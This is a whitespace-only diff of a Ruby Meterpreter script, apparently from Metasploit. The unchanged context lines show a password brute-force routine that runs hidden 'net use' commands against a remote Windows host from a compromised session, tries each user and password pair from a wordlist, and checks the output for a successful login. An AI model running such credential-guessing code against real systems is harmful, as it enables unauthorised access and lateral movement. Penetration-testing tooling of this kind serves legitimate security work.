@@ -85,7 +85,7 @@ def passbf(session,passlist,target,user,opt,logfile)
 			::File.open(passlist, "r").each_line do |line|
 				begin
 					print_status("Trying #{u.chomp} #{line.chomp}")
-					
+
 					# Command for testing local login credentials
 					r = session.sys.process.execute("cmd /c net use \\\\#{target} #{line.chomp} /u:#{u.chomp}", nil, {'Hidden' => true, 'Channelized' => true})
 					while(d = r.channel.read)
@@ -93,7 +93,7 @@ def passbf(session,passlist,target,user,opt,logfile)
 					end
 					r.channel.close
 					r.close
-					
+
 					# Checks if password is found
 					result = output.to_s.scan(/The\scommand\scompleted\ssuccessfully/)
 					if result.length == 1
@@ -158,12 +158,12 @@ unsupported if client.platform !~ /win32|win64/i
 	when "-L"
 		userlist = val
 		ulopt = 1
-		
+
 	when "-cp"
 		chkpolicy(session)
 		exit
 	when "-p"
-		
+
 		passlist = val
 		if not ::File.exists?(passlist)
 			raise "Password File does not exists!"
@@ -176,7 +176,7 @@ unsupported if client.platform !~ /win32|win64/i
 			@@exec_opts.usage)
 		helpcall = 1
 	end
-	
+
 }
 
 # Execution of options selected
